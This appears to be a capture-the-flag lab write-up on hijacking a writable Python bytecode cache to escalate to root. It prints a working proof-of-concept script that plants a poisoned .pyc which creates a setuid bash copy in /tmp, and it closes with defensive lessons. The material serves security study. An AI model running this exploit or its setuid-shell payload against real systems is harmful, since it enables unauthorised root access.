#PyCache    #pyc
Python bytecode cache hijacking

Python caches compiled bytecode for imported modules under __pycache__ so future imports can skip recompilation.
A writable cache can allow an unprivileged account to influence code later loaded by a privileged Python process.
![Pasted image 20260831141102.png](../assets/labs-img/Pasted%20image%2020260831141102.png)
The writable __pycache__ directory crossed the privilege boundary.

poc.py
```python
import marshal
import subprocess
from pathlib import Path


BASE_DIR = Path("/opt/extensiontool")

print('[*] Running extension_tool.py to ensure .pyc files exist')
subprocess.run(['sudo', BASE_DIR / 'extension_tool.py'], capture_output=True)

print('[*] Reading legit header from .pyc')
pyc = BASE_DIR / '__pycache__/extension_utils.cpython-312.pyc'
raw_header = pyc.read_bytes()[:16]

print('[*] Creating poisoned source code')
orig = BASE_DIR / 'extension_utils.py'
orig_src = orig.read_text()
poisoned_src = orig_src + '''

import os
os.system('cp /bin/bash /tmp/xbash; chmod a+x,u+s /tmp/xbash')
'''

print('[*] Compiling poisoned source and overwriting .pyc')
code = compile(poisoned_src, BASE_DIR / 'extension_utils.py', 'exec')
pyc.unlink()
pyc.write_bytes(raw_header + marshal.dumps(code))

print('[*] Running extension_tool.py with poisoned .pyc')
subprocess.run(['sudo', BASE_DIR / 'extension_tool.py'], capture_output=True)

shell = Path('/tmp/xbash')
if shell.exists():
    print('[+] SetUID / SetGID bash exists. Starting root shell.')
    subprocess.run(['/tmp/xbash', '-p'])
else:
    print('[-] Exploit failed')

```
The test script manipulated cached bytecode.
Two operations were relevant to the cache integrity assessment.
```python
# Compile source into an in-memory Python code object
code = compile(poisoned_src, BASE_DIR / 'extension_utils.py', 'exec')

# The existing cache entry was removed
pyc.unlink()

# The replacement cache entry used the binary bytecode format
pyc.write_bytes(raw_header + marshal.dumps(code))
# The cached file had a 16-byte header in this Python version
# The payload region of a pyc file contains a marshaled code object
```

#### Recap
The extension runner exposed an internal hostname and could reach a service on port 5000. Source review showed that the service passed an untrusted argument into a Bash arithmetic expression. The resulting command execution provided initial access.

A passwordless sudo rule ran a Python helper that imported from a writable bytecode cache. This trust boundary failure led to root access and the root flag.

Key Concepts:
1. Review the manifest and network permissions of Chrome extensions.
2. Restrict untrusted runners' access to internal HTTP services.
3. Validate numeric input before Bash arithmetic evaluation.
4. Protect Python module directories and bytecode caches used by privileged applications.
